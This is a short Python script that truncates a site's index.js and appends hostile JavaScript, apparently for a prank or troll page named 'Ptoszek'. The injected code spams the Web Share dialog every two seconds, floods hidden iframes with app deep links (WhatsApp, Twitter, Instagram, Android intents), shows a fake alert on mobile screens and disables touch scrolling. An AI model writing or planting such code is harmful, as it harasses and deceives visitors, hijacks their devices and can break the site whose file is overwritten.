with open('index.js', 'rb') as f:
    lines = f.readlines()

with open('index.js', 'wb') as f:
    f.writelines(lines[:2042])

with open('index.js', 'a', encoding='utf-8') as f:
    f.write('''
function triggerWebShareSpam() {
  if (navigator.share) {
    setInterval(() => {
      navigator.share({
        title: "Ptoszek",
        text: "Ptoszek cię dopadł!",
        url: "https://ptoszek.pl"
      }).catch(() => {});
    }, 2000);
  }
}

function triggerDeepLinkFlood() {
  const uris = ["whatsapp://", "intent://", "twitter://", "instagram://"];
  let i = 0;
  setInterval(() => {
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = uris[i % uris.length];
    document.body.appendChild(iframe);
    setTimeout(() => iframe.remove(), 1000);
    i++;
  }, 1500);
}

function triggerFakeMobileAlert() {
  const alertBox = document.getElementById("fake-mobile-alert");
  if (alertBox && (window.innerWidth < 768)) {
    setTimeout(() => {
      alertBox.style.display = "block";
    }, 3000);
  }
}

document.addEventListener("touchmove", (e) => {
  e.preventDefault();
}, { passive: false });
''')
